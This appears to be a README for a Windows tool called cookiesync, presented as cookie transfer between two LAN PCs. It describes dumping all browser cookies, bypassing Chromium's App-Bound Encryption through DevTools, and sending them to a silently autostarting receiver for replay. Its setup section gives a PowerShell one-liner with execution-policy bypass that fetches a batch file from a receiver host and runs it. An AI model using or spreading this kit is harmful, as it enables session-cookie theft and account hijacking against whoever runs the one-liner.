# cookiesync

One-line, repeatable cookie transfer between two PCs on the same LAN.

Paste one line on the source. The receiver stores a timestamped JSON dump. Built for when
you have ongoing access to both machines.

## Flow

```
  SOURCE                                 DESTINATION
  1. UDP broadcast  ------------------>  2. receiver answers with its IP
  3. launch browser w/ DevTools  ----->  4. Network.getAllCookies
  5. POST /cookies  ------------------>  6. dumps/<time>_<ip>.json
```

Chromium browsers go through DevTools, so App-Bound Encryption is irrelevant. Firefox is
read with `browser_cookie3`, which needs no key material either.

## Setup

Destination, once:

```bat
receiver\start_receiver.bat
receiver\install_autostart.bat
```

`install_autostart.bat` adds firewall rules and a silent startup shortcut, so the receiver
survives reboots with no interaction. It reads `port` and `discovery_port` from
`config.json`, so set those before running it.

Source, each time (append your token as the second argument if you set one):

```powershell
powershell -NoP -Exec Bypass -c "iwr http://DEST_IP:8000/sender/fetch_and_run.bat -OutFile $env:TEMP\cs.bat; & $env:TEMP\cs.bat http://DEST_IP:8000"
```

With a token:

```powershell
powershell -NoP -Exec Bypass -c "iwr 'http://DEST_IP:8000/sender/fetch_and_run.bat?t=YOURTOKEN' -OutFile $env:TEMP\cs.bat; & $env:TEMP\cs.bat http://DEST_IP:8000 YOURTOKEN"
```

Or clone on the source and run `sender\run.bat`, which auto-discovers the receiver.

## Sender flags

| Flag | Meaning |
|---|---|
| `--host HOST` | Skip discovery |
| `--port N` | Override port |
| `--token T` | Auth token, must match receiver |
| `--out FILE` | Write locally, send nothing |
| `--no-close-browsers` | Leave browsers open |
| `--list-hosts` | List discovered receivers |
| `--quiet` | No progress output |

## Config

Copy `config.example.json` to `config.json`. Both sides read it.

- `token` - receiver rejects requests without it when set.
- `serve_files` - lets the receiver hand out sender scripts for the one-liner.
- `close_browsers` - CDP needs a free profile.

## Output

`dumps/<YYYYmmdd_HHMMSS>_<source-ip>.json`, replayable with `requests.Session.cookies`.

## Troubleshooting

No receiver found: UDP broadcast is often dropped on guest/enterprise networks, pass
`--host`. 401: token set but not passed, or passed without `?t=` on the file fetch.
Chrome timeout: browser was already running, drop `--no-close-browsers`. Port busy: change
`port` and rerun `install_autostart.bat`.

## Uninstall

```bat
receiver\uninstall_autostart.bat
```

## License

MIT, see `../LICENSE`.